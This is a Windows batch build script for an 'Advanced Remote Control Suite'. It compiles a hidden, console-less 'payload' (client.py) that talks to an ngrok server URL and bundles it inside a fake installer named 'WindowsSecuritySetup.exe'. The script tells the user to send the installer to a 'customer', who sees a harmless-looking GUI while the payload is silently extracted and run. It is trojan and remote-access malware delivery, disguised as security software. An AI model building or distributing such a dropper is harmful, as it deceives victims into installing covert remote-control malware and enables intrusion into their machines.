@echo off
echo ====================================================
echo Building Advanced Remote Control Suite
echo ====================================================
echo.
echo ====================================================
echo WARNING: Did you paste your Cloud URL into client.py?
echo If SERVER_URL is still 'PASTE_YOUR_NGROK_URL_HERE', 
echo this executable WILL NOT WORK!
echo ====================================================
pause
echo.

echo [1] Installing required packages...
pip install -r requirements.txt

echo.
echo [2] Compiling Payload (client.py) into invisible background process...
pyinstaller --onefile --noconsole client.py

echo.
echo [3] Compiling Fake Installer (WindowsSecurityInstaller.py)...
echo We are embedding the 'client.exe' directly inside the installer using --add-data!
pyinstaller --onefile --noconsole --name "WindowsSecuritySetup" --add-data "dist\client.exe;." WindowsSecurityInstaller.py

echo.
echo [4] Done! 
echo Check the /dist folder. 
echo 1. You should see "WindowsSecuritySetup.exe"
echo 2. Send "WindowsSecuritySetup.exe" to your customer.
echo 3. When they run it, it shows a safe GUI but silently extracts and runs the payload!
echo.
pause
